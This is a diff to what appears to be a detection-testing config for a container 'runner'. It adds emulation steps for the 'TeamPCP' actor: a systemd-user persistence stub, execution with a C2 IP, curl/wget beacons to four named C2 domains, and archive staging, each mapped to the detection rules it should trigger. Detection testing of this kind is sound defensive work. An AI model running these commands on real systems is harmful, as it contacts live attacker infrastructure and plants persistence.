@@ -747,6 +747,28 @@ attacks:
         ruleName: Unexpected Egress Network Traffic
         containerName: runner
 
+  # T1543.002 — TeamPCP systemd-user persistence: drop ~/.config/systemd/user/sysmon.py
+  - name: persist-systemd-user-backdoor
+    type: custom
+    exec:
+      command: ["sh", "-c", "D=$HOME/.config/systemd/user; mkdir -p $D; printf '#!/usr/bin/env python3\\nimport sys\\nprint(sys.argv[1:])\\n' > $D/sysmon.py; chmod +x $D/sysmon.py; echo persisted"]
+    expectedDetections:
+      - attackType: custom
+        ruleID: R0002
+        ruleName: Files Access Anomalies in container
+        containerName: runner
+
+  # T1059.006 — TeamPCP backdoor: exec sysmon.py carrying the C2 IP 45.148.10.212 in argv
+  - name: persist-backdoor-process-exec
+    type: custom
+    exec:
+      command: ["sh", "-c", "S=$HOME/.config/systemd/user/sysmon.py; [ -x $S ] || { mkdir -p $HOME/.config/systemd/user; printf '#!/usr/bin/env python3\\nimport sys\\nprint(sys.argv[1:])\\n' > $S; chmod +x $S; }; $S --c2 45.148.10.212 --host scan.aquasecurtiy.org || true; echo ran"]
+    expectedDetections:
+      - attackType: custom
+        ruleID: R0002
+        ruleName: Files Access Anomalies in container
+        containerName: runner
+
   # T1071.001 — beacon out over the runner's normal HTTPS egress path
   - name: c2-beacon-over-https
     type: custom
@@ -760,6 +782,21 @@ attacks:
       - attackType: custom
         ruleID: R0005
         ruleName: DNS Anomalies in container
+        containerName: runner
+
+  # T1071.004 — TeamPCP C2 beacon: resolve and beacon to the advisory's four C2/payload domains
+  - name: c2-beacon-over-dns
+    type: custom
+    exec:
+      command: ["sh", "-c", "for d in scan.aquasecurtiy.org hackmoltrepeat.com tdtqy-oyaaa-aaaae-af2dq-cai.raw.icp0.io plug-tab-protective-relay.trycloudflare.com; do getent hosts $d >/dev/null 2>&1; (command -v curl >/dev/null && curl -s -m 3 -o /dev/null https://$d/ || wget -q -T3 -O /dev/null https://$d/) 2>/dev/null; done; echo beaconed"]
+    expectedDetections:
+      - attackType: custom
+        ruleID: R0005
+        ruleName: DNS Anomalies in container
+        containerName: runner
+      - attackType: custom
+        ruleID: R0011
+        ruleName: Unexpected Egress Network Traffic
         containerName: runner
 
   # T1496 — the runner's 4 CPU / 12Gi limit is a mining target in itself
@@ -865,6 +902,13 @@ attacks:
         ruleID: R0006
         ruleName: Unexpected service account token access
         containerName: runner
+
+  # T1560.001 — TeamPCP collection: stage tpcp.tar.gz (tar uses openat2; profile blind spot, scores FN without a CEL rule)
+  - name: exfil-stage-archive
+    type: custom
+    exec:
+      command: ["sh", "-c", "W=$(mktemp -d); echo tpcp > $W/collected.txt; tar czf $HOME/tpcp.tar.gz -C $W collected.txt; ls -l $HOME/tpcp.tar.gz; echo archived"]
+    expectedDetections: []
 
   # ═══════════════════════════════════════════════════════════════════════════
   # Phase 10: DEFENCE EVASION AND ANTI-FORENSICS (TA0005)
